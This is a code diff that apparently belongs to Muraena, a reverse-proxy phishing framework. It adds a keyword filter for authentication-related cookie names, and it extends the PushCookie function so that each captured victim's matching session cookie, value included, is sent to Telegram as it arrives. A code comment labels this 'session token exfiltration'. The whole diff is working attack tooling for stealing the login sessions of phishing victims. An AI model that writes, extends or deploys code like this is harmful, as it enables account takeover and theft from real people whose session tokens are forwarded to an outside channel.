@@ -4,15 +4,43 @@ import (
 	"encoding/json"
 	"fmt"
 	"os"
+	"strings"
 	"time"
 
 	"github.com/evilsocket/islazy/tui"
 
 	"github.com/muraenateam/muraena/module/necrobrowser"
+	"github.com/muraenateam/muraena/module/telegram"
 
 	"github.com/muraenateam/muraena/core/db"
 	"github.com/muraenateam/muraena/log"
 )
+
+// authCookieKeywords is a case-insensitive filter: a captured cookie is pushed
+// to Telegram only if its name contains at least one of these substrings
+var authCookieKeywords = []string{
+	"session",
+	"token",
+	"auth",
+	"sid",
+	"jwt",
+	"sso",
+	"remember",
+	"login",
+	"csrf",
+	"bearer",
+}
+
+// isAuthCookie returns true if the cookie name looks authentication-related
+func isAuthCookie(name string) bool {
+	lower := strings.ToLower(name)
+	for _, keyword := range authCookieKeywords {
+		if strings.Contains(lower, keyword) {
+			return true
+		}
+	}
+	return false
+}
 
 func (module *Tracker) GetVictim(t *Trace) (v *db.Victim, err error) {
 
@@ -145,4 +173,16 @@ func (module *Tracker) PushCookie(victim *db.Victim, cookie db.VictimCookie) {
 	}
 
 	module.Verbose("[%s][+] cookie: %s (%s)", victim.ID, tui.Bold(tui.Green(cookie.Name)), tui.Bold(tui.Green(cookie.Domain)))
+
+	// Real-time session token exfiltration to Telegram (auth cookies only)
+	if isAuthCookie(cookie.Name) {
+		if tel := telegram.Self(module.Session); tel != nil {
+			tel.Send(fmt.Sprintf("[victim %s] session token: %s=%s (domain: %s)",
+				victim.ID,
+				tui.Bold(cookie.Name),
+				tui.Bold(tui.Red(cookie.Value)),
+				cookie.Domain,
+			))
+		}
+	}
 }
